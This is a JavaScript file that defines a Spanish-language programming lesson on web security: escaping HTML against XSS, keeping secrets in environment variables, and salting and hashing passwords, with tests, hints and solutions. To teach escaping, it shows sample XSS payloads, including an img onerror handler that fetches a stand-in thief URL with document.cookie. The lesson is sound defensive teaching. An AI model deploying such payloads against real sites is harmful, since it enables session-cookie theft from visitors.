// Ruta "El oficio", lección 6: seguridad II. XSS, secretos y contraseñas.
//
// La parte de XSS va en JavaScript (motor "javascript"), porque es un ataque
// a las páginas web; las de secretos y contraseñas, en Python (el motor de la
// ruta), porque son trabajo del servidor.
//
// El paso de XSS empieza con una escaparHtml que no escapa nada: así la del
// estudiante siempre tapa cualquier otra que exista en la página (formato.js
// tiene una), y las pruebas revisan la suya.

(function () {
  'use strict';

  const comprobar = (lineas) =>
    `(lambda g: (exec(${JSON.stringify(lineas.join('\n'))}, g), g.get("ok"))[1])(dict(globals())) is True`;

  // ---------- Práctica: escapar ----------

  const TARJETA = [
    'function tarjetaResena(resena) {',
    '  // resena = { autor, texto, estrellas }',
    '  return (',
    '    "<li><strong>" + escaparHtml(String(resena.autor)) + "</strong> (" +',
    '    escaparHtml(String(resena.estrellas)) + "★): " + escaparHtml(String(resena.texto)) + "</li>"',
    '  );',
    '}',
  ];
  const TARJETA_INSEGURA = [
    'function tarjetaResena(resena) {',
    '  // resena = { autor, texto, estrellas }',
    '  return "<li><strong>" + resena.autor + "</strong> (" + resena.estrellas + "★): " + resena.texto + "</li>";',
    '}',
  ];

  const practicaXss = (escapar, tarjeta) =>
    [
      ...escapar,
      '',
      ...tarjeta,
      '',
      'const ataque = {',
      '  autor: "Visitante",',
      '  texto: \'Rico <img src="x" onerror="alert(document.cookie)">\',',
      '  estrellas: 5,',
      '};',
      'console.log(tarjetaResena({ autor: "Ana", texto: "Las arepas, lo mejor", estrellas: 5 }));',
      'console.log(tarjetaResena(ataque));',
    ].join('\n');

  const ESCAPAR_VACIO = [
    'function escaparHtml(texto) {',
    '  // Cambia & < > " \' por sus entidades. ¡El & va primero!',
    '  return texto;',
    '}',
  ];
  const ESCAPAR = [
    'function escaparHtml(texto) {',
    '  // El & va primero: si fuera al final, dañaría los &lt; que ya pusimos.',
    '  return texto',
    '    .replaceAll("&", "&amp;")',
    '    .replaceAll("<", "&lt;")',
    '    .replaceAll(">", "&gt;")',
    '    .replaceAll(\'"\', "&quot;")',
    '    .replaceAll("\'", "&#39;");',
    '}',
  ];

  // ---------- Secretos ----------

  const SECRETOS_INICIAL = [
    'import os',
    '',
    '# config.py, como lo dejó el programador anterior (y así quedó subido a GitHub)',
    'CLAVE_PASARELA = "sk_live_51HxDonPepe9aQ2"   # la clave para cobrar con tarjeta',
    'CORREO_TIENDA = "pedidos@tiendadonpepe.co"',
    '',
    '',
    'def configuracion():',
    '    return {"clave_pasarela": CLAVE_PASARELA, "correo": CORREO_TIENDA}',
    '',
    '',
    'def para_el_registro(config):',
    '    # Lo que se escribe en el registro (log) del servidor',
    '    return config',
    '',
    '',
    'print(para_el_registro(configuracion()))',
  ];
  const SECRETOS_SOLUCION = [
    'import os',
    '',
    '# El correo no es secreto: puede quedarse en el código.',
    'CORREO_TIENDA = "pedidos@tiendadonpepe.co"',
    '',
    '',
    'def configuracion():',
    '    # Se lee al llamar la función, no al cargar el archivo: así el servidor',
    '    # usa la clave que tenga el computador donde corre.',
    '    clave = os.environ.get("CLAVE_PASARELA", "")',
    '    if clave == "":',
    '        raise RuntimeError("Falta la variable de entorno CLAVE_PASARELA")',
    '    return {"clave_pasarela": clave, "correo": CORREO_TIENDA}',
    '',
    '',
    'def para_el_registro(config):',
    '    # Un diccionario nuevo: el original sigue sirviendo para cobrar.',
    '    clave = config["clave_pasarela"]',
    '    return {**config, "clave_pasarela": "****" + clave[-4:]}',
    '',
    '',
    '# En esta página no hay variable de entorno: así se ve el error.',
    'try:',
    '    print(para_el_registro(configuracion()))',
    'except RuntimeError as error:',
    '    print("No arranca:", error)',
    '',
    'print(para_el_registro({"clave_pasarela": "sk_test_4242424242", "correo": CORREO_TIENDA}))',
  ];

  // Pone (o quita) la variable de entorno solo durante la prueba.
  const conVariable = (valor, cuerpo) =>
    comprobar([
      'import os',
      'antes = os.environ.get("CLAVE_PASARELA")',
      valor === null ? 'os.environ.pop("CLAVE_PASARELA", None)' : 'os.environ["CLAVE_PASARELA"] = ' + JSON.stringify(valor),
      'try:',
      ...cuerpo.map((linea) => '    ' + linea),
      'finally:',
      '    if antes is None:',
      '        os.environ.pop("CLAVE_PASARELA", None)',
      '    else:',
      '        os.environ["CLAVE_PASARELA"] = antes',
    ]);

  const lanzaRuntimeError = [
    'try:',
    '    configuracion()',
    '    ok = False',
    'except RuntimeError as error:',
    '    ok = "CLAVE_PASARELA" in str(error)',
    'except Exception:',
    '    ok = False',
  ];

  // ---------- Reto: contraseñas ----------

  const CLAVES_INICIAL = [
    'import hashlib',
    'import hmac',
    'import secrets',
    '',
    'MINIMO_LETRAS = 8',
    '',
    '',
    'def guardar_clave(clave):',
    '    # Lo que se guarda en la base de datos para este usuario',
    '    return clave',
    '',
    '',
    'def verificar_clave(clave, guardada):',
    '    return clave == guardada',
    '',
    '',
    'guardada = guardar_clave("arepas-con-queso")',
    'print("En la base queda:", guardada)',
    'print("¿Entra con la clave correcta?", verificar_clave("arepas-con-queso", guardada))',
    'print("¿Entra con otra?", verificar_clave("123456", guardada))',
  ];
  const CLAVES_SOLUCION = [
    'import hashlib',
    'import hmac',
    'import secrets',
    '',
    'MINIMO_LETRAS = 8',
    '',
    '',
    'def huella(clave, sal):',
    '    return hashlib.sha256((sal + clave).encode("utf-8")).hexdigest()',
    '',
    '',
    'def guardar_clave(clave):',
    '    if len(clave) < MINIMO_LETRAS:',
    '        raise ValueError("La contraseña debe tener al menos " + str(MINIMO_LETRAS) + " caracteres")',
    '    # Una sal nueva y al azar para cada contraseña',
    '    sal = secrets.token_hex(16)',
    '    return sal + "$" + huella(clave, sal)',
    '',
    '',
    'def verificar_clave(clave, guardada):',
    '    sal, huella_guardada = guardada.split("$")',
    '    # compare_digest tarda lo mismo aunque la primera letra ya sea distinta:',
    '    # así nadie puede adivinar la huella midiendo cuánto tarda la respuesta.',
    '    return hmac.compare_digest(huella(clave, sal), huella_guardada)',
    '',
    '',
    'guardada = guardar_clave("arepas-con-queso")',
    'print("En la base queda:", guardada)',
    'print("¿Entra con la clave correcta?", verificar_clave("arepas-con-queso", guardada))',
    'print("¿Entra con otra?", verificar_clave("123456", guardada))',
  ];

  globalThis.Rutas.agregarLeccion('oficio', {
    id: 'xss-claves-secretos',
    titulo: 'Seguridad II: XSS, secretos y contraseñas',
    pasos: [
      {
        id: 'idea',
        motor: 'javascript',
        titulo: 'XSS: cuando un texto se vuelve código',
        texto: [
          'La tienda de Don Pepe muestra las reseñas de los clientes. Si la página pinta cada reseña con `innerHTML`, el navegador **interpreta** el texto como HTML. Y alguien puede escribir como "reseña" una etiqueta con código: `<img src="x" onerror="...">`. La imagen no carga, el `onerror` se ejecuta **en el navegador de cada persona que vea la reseña**, y ese código puede leer su sesión y mandarla a otro sitio. Eso es **XSS** (*cross-site scripting*), uno de los ataques web más comunes.',
          'La defensa número uno: pintar el texto con `textContent`, que lo pone **tal cual**, letra por letra, sin interpretar nada. Esta misma app lo hace así: todo texto que viene de una lección o de lo que tú escribes pasa por `textContent`, y `innerHTML` solo recibe HTML que la app ya escapó (mira la función `crear` en `js/app.js`).',
          'Cuando no hay más remedio que armar HTML como texto (una plantilla, un correo), se **escapa**: se cambian los caracteres especiales por **entidades**, como `&lt;` en vez de `<`. El navegador muestra `<`, pero ya no lo toma como el comienzo de una etiqueta. Ejecuta el ejemplo y compara lo que recibiría el navegador en cada caso.',
        ],
        codigo: [
          '// Una "reseña" que alguien escribió en la página:',
          'const resena = \'Muy rico <img src="x" onerror="fetch(\\\'https://ladron.co/?s=\\\' + document.cookie)">\';',
          '',
          '// Página insegura: lista.innerHTML = "<li>" + resena + "</li>"',
          'console.log("Con innerHTML, el navegador recibe:");',
          'console.log("<li>" + resena + "</li>");',
          'console.log("→ ve una etiqueta <img>, no la puede cargar y EJECUTA el onerror.");',
          'console.log("");',
          '',
          '// Escapado: los caracteres especiales se vuelven entidades',
          'const escapado = resena',
          '  .replaceAll("&", "&amp;")',
          '  .replaceAll("<", "&lt;")',
          '  .replaceAll(">", "&gt;")',
          '  .replaceAll(\'"\', "&quot;")',
          '  .replaceAll("\'", "&#39;");',
          'console.log("Escapado, el navegador recibe:");',
          'console.log("<li>" + escapado + "</li>");',
          'console.log("→ muestra el texto tal cual; no hay ninguna etiqueta que ejecutar.");',
        ].join('\n'),
      },
      {
        id: 'practica',
        motor: 'javascript',
        titulo: 'Escapar antes de armar HTML',
        texto: [
          'Completa `escaparHtml(texto)`: cambia **todos** los `&` por `&amp;`, `<` por `&lt;`, `>` por `&gt;`, `"` por `&quot;` y `\'` por `&#39;`. Usa `replaceAll` (o `replace` con `/g`): un `replace` sin `/g` solo cambia el primero, y al atacante le basta con poner dos.',
          '**El orden importa**: el `&` va **primero**. Si lo cambias al final, también dañarías los `&lt;` que acabas de escribir (quedarían `&amp;lt;` y en pantalla se vería `&lt;`).',
          'Después arregla `tarjetaResena(resena)` para que escape **cada dato** que viene del cliente: el autor, el texto y hasta las estrellas (convierte cada uno con `String(...)` antes de escaparlo: un atacante puede mandar texto donde esperabas un número). El HTML propio de la tarjeta (`<li>`, `<strong>`) no se escapa: ese lo escribiste tú.',
        ],
        codigo: practicaXss(ESCAPAR_VACIO, TARJETA_INSEGURA),
        pruebas: [
          {
            descripcion: 'Escapa los cinco caracteres especiales',
            condicion: 'escaparHtml(\'<b>"Hola" & \\\'chao\\\'</b>\') === "&lt;b&gt;&quot;Hola&quot; &amp; &#39;chao&#39;&lt;/b&gt;"',
          },
          { descripcion: 'Escapa todas las veces que aparecen, no solo la primera', condicion: 'escaparHtml("a<b<c>>d") === "a&lt;b&lt;c&gt;&gt;d"' },
          { descripcion: 'El & va primero (no daña lo que ya escapó)', condicion: 'escaparHtml("<") === "&lt;" && escaparHtml("&lt;") === "&amp;lt;"' },
          { descripcion: 'Un texto normal no cambia', condicion: 'escaparHtml("Arepa rica, 10/10. ¡Volveré!") === "Arepa rica, 10/10. ¡Volveré!"' },
          { descripcion: 'Una reseña normal se ve igual que antes', condicion: 'tarjetaResena({ autor: "Ana", texto: "Rico", estrellas: 5 }) === "<li><strong>Ana</strong> (5★): Rico</li>"' },
          {
            descripcion: 'Ninguna parte de la reseña puede meter etiquetas',
            condicion:
              '(() => { const t = tarjetaResena({ autor: "<script>robar()</script>", texto: \'<img src="x" onerror="robar()">\', estrellas: "5<b>" }); return !/<(script|img|b)\\b/i.test(t) && t.includes("&lt;img") && t.startsWith("<li><strong>") && t.endsWith("</li>"); })()',
          },
        ],
        pistas: [
          'Encadena reemplazos: `return texto.replaceAll("&", "&amp;").replaceAll("<", "&lt;")` y sigue con `>`, `"` y `\'`.',
          'Para la comilla doble usa comillas simples alrededor: `.replaceAll(\'"\', "&quot;")`; y para la simple, dobles: `.replaceAll("\'", "&#39;")`.',
          'En la tarjeta, cambia cada dato por su versión escapada: `escaparHtml(String(resena.autor))`, `escaparHtml(String(resena.estrellas))` y `escaparHtml(String(resena.texto))`.',
        ],
        solucion: practicaXss(ESCAPAR, TARJETA),
      },
      {
        id: 'secretos',
        etiqueta: 'Secretos',
        titulo: 'Las claves no van en el código',
        texto: [
          'Un sistema real usa **secretos**: la clave para cobrar con tarjeta, la contraseña de la base de datos, la clave de la API de IA. Si están escritos en el código, terminan en GitHub, en el computador de cada persona del equipo y en cada copia del proyecto. Hay programas que recorren GitHub buscando claves así, y las encuentran en minutos.',
          'La costumbre del oficio: los secretos van en **variables de entorno**, valores que el sistema operativo o el servidor le entregan al programa al arrancar. En Python se leen con `os.environ`. En tu computador se suelen guardar en un archivo `.env` que **nunca** se sube (se pone en `.gitignore`). Y si una clave ya se subió, no basta con borrarla: Git recuerda la historia. Hay que **cambiarla** (pedir una nueva) de inmediato.',
          'Arregla `config.py`: **1.** Quita la clave del código y léela de la variable de entorno `CLAVE_PASARELA` **dentro** de `configuracion()`. Si no existe o está vacía, lanza `RuntimeError` con un mensaje que nombre la variable: es mejor que el servidor no arranque a que arranque sin poder cobrar. El correo no es secreto: puede quedarse. **2.** `para_el_registro(config)` devuelve lo que se escribe en el log del servidor: debe dar un diccionario **nuevo** con la clave tapada, `"****"` más sus últimos 4 caracteres.',
        ],
        codigo: SECRETOS_INICIAL.join('\n'),
        pruebas: [
          { descripcion: 'La clave ya no está escrita en el código', condicion: '"sk_live" not in codigo' },
          {
            descripcion: 'configuracion() usa la clave de la variable de entorno',
            condicion: conVariable('sk_test_123456', [
              'c = configuracion()',
              'ok = c["clave_pasarela"] == "sk_test_123456" and c["correo"] == "pedidos@tiendadonpepe.co"',
            ]),
          },
          { descripcion: 'Si la variable no existe, lanza RuntimeError que la nombra', condicion: conVariable(null, lanzaRuntimeError) },
          { descripcion: 'Si la variable está vacía, también', condicion: conVariable('', lanzaRuntimeError) },
          {
            descripcion: 'El registro muestra la clave tapada, sin cambiar la original',
            condicion: comprobar([
              'original = {"clave_pasarela": "sk_test_4242424242", "correo": "a@b.co"}',
              'r = para_el_registro(original)',
              'ok = r == {"clave_pasarela": "****4242", "correo": "a@b.co"} and original["clave_pasarela"] == "sk_test_4242424242"',
            ]),
          },
        ],
        pistas: [
          'Borra la línea `CLAVE_PASARELA = "sk_live_..."`. Dentro de `configuracion()` lee `clave = os.environ.get("CLAVE_PASARELA", "")`.',
          'Si `clave == ""`, lanza `raise RuntimeError("Falta la variable de entorno CLAVE_PASARELA")`. Al final del archivo, llama a `configuracion()` dentro de un `try` para que en esta página (sin la variable) se vea el mensaje en vez de detenerse.',
          'En `para_el_registro`: `return {**config, "clave_pasarela": "****" + config["clave_pasarela"][-4:]}`. El `**config` copia todo en un diccionario nuevo y la clave de después reemplaza la de la copia.',
        ],
        solucion: SECRETOS_SOLUCION.join('\n'),
      },
      {
        id: 'reto',
        titulo: 'Reto: guardar contraseñas como se debe',
        texto: [
          'El sistema de Don Pepe guarda las contraseñas tal cual. Si un día alguien se roba la base de datos (pasa más de lo que crees), se lleva las contraseñas de todos, y mucha gente usa la misma en el banco. **Nunca** se guarda una contraseña en texto plano.',
          'Se guarda una **huella** (*hash*): un resumen que se calcula fácil pero que no se puede devolver a la contraseña. Para revisar el inicio de sesión se calcula la huella de lo que escribió la persona y se compara. Y se le agrega una **sal**: un texto al azar, distinto para cada usuario, que se guarda junto a la huella. Así dos personas con la misma contraseña tienen huellas distintas, y al ladrón no le sirven sus tablas de huellas ya calculadas.',
          'Escribe `guardar_clave(clave)`: si tiene menos de 8 caracteres lanza `ValueError`; si no, crea una sal con `secrets.token_hex(16)` y devuelve `sal + "$" + huella`, donde la huella es `hashlib.sha256((sal + clave).encode("utf-8")).hexdigest()`. Y `verificar_clave(clave, guardada)`: separa la sal y la huella, recalcula y compara con `hmac.compare_digest`. **Una aclaración honesta**: SHA-256 es muy rápido, y para contraseñas conviene una función lenta a propósito (bcrypt o Argon2). En un proyecto real usas una librería que ya lo hace bien; aquí lo armas a mano para entender qué hace por dentro.',
        ],
        codigo: CLAVES_INICIAL.join('\n'),
        pruebas: [
          { descripcion: 'Lo que se guarda no contiene la contraseña', condicion: '"arepas-con-queso" not in guardar_clave("arepas-con-queso")' },
          {
            descripcion: 'Se guarda como sal$huella, con la huella SHA-256 de sal + clave',
            condicion: '(lambda g: len(g.split("$")) == 2 and len(g.split("$")[0]) >= 16 and g.split("$")[1] == hashlib.sha256((g.split("$")[0] + "arepas-con-queso").encode("utf-8")).hexdigest())(guardar_clave("arepas-con-queso"))',
          },
          { descripcion: 'La misma contraseña guardada dos veces da resultados distintos (sal al azar)', condicion: 'guardar_clave("arepas-con-queso") != guardar_clave("arepas-con-queso")' },
          {
            descripcion: 'verificar_clave acepta la correcta y rechaza las demás',
            condicion: '(lambda g: verificar_clave("arepas-con-queso", g) is True and verificar_clave("arepas-con-quesO", g) is False and verificar_clave("arepas-con-queso ", g) is False and verificar_clave("", g) is False)(guardar_clave("arepas-con-queso"))',
          },
          {
            descripcion: 'Una contraseña de menos de 8 caracteres lanza ValueError',
            condicion: comprobar(['try:', '    guardar_clave("1234567")', '    ok = False', 'except ValueError:', '    ok = True', 'except Exception:', '    ok = False']) + ' and isinstance(guardar_clave("12345678"), str)',
          },
          {
            descripcion: 'La comparación usa hmac.compare_digest',
            // Espía: reemplaza compare_digest un momento, cuenta las llamadas y lo restaura siempre.
            condicion: comprobar([
              'import hmac',
              'real = hmac.compare_digest',
              'llamadas = []',
              'hmac.compare_digest = lambda a, b: llamadas.append(1) or real(a, b)',
              'try:',
              '    guardada = guardar_clave("arepas-con-queso")',
              '    acepta = verificar_clave("arepas-con-queso", guardada)',
              'finally:',
              '    hmac.compare_digest = real',
              'ok = acepta is True and len(llamadas) >= 1',
            ]),
          },
        ],
        pistas: [
          'Escribe una ayuda: `def huella(clave, sal): return hashlib.sha256((sal + clave).encode("utf-8")).hexdigest()`.',
          'En `guardar_clave`: primero el `if len(clave) < MINIMO_LETRAS: raise ValueError(...)`, luego `sal = secrets.token_hex(16)` y `return sal + "$" + huella(clave, sal)`.',
          'En `verificar_clave`: `sal, huella_guardada = guardada.split("$")` y `return hmac.compare_digest(huella(clave, sal), huella_guardada)`.',
        ],
        solucion: CLAVES_SOLUCION.join('\n'),
      },
    ],
  });
})();
